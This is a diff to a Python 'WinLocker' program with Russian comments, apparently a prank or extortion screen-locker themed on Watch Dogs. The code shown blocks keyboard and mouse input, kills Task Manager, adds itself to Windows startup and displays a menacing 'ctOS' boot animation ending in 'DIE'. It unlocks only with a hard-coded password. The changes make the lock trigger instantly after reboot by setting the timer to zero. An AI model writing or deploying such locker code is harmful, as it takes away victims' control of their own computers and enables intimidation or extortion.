@@ -2,7 +2,7 @@ import ctypes, os, sys, time, threading, random, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
-TIMER_SECONDS = 15  # для теста, потом 600
+TIMER_SECONDS = 15  # для теста, потом 0 для мгновенной активации
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
@@ -38,7 +38,7 @@ def show_boot_animation():
     lbl = tk.Label(root, text="", fg='white', bg='black', font=('Courier', 36, 'bold'))
     lbl.pack(expand=True)
     messages = [
-        "ВАС ЗАМЕТИЛ МАРКУС...",
+        "ВАС ЗАМЕТИЛ DEDSEK...",
         "ПОДКЛЮЧЕНИЕ К ctOS 2.0...",
         "РАСШИФРОВКА КЛЮЧЕЙ...",
         "DIE"
@@ -108,6 +108,10 @@ class WinLocker:
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
+    # Если скрипт уже в автозагрузке, таймер не нужен
+    if os.path.basename(sys.argv[0]) != "winlocker.py":
+        TIMER_SECONDS = 0  # Мгновенная активация после перезагрузки
+    
     add_to_startup()
     threading.Thread(target=kill_taskmgr, daemon=True).start()
     time.sleep(TIMER_SECONDS)
